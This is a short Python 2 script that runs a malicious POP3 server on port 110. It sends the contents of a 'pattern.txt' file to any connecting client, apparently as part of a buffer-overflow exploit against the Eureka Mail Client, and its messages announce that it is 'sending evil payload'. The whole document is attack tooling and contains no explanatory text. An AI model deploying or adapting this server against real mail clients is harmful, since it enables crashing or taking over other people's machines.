import socket

with open("pattern.txt", 'r') as f:
    payload = f.read(2000)

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((socket.gethostname(), 110))
serversocket.listen(5)

print "[+] Listening on tcp port 110 [POP3]..."
print "[+] Configure Eureka Mail Client to connect to this host"
while 1:
    #accept connections from outside
    (clientsocket, address) = serversocket.accept()

    print "[+] Client connected, sending evil payload"
    clientsocket.send(payload)
    clientsocket.close()
    print "[+] Connection closed"
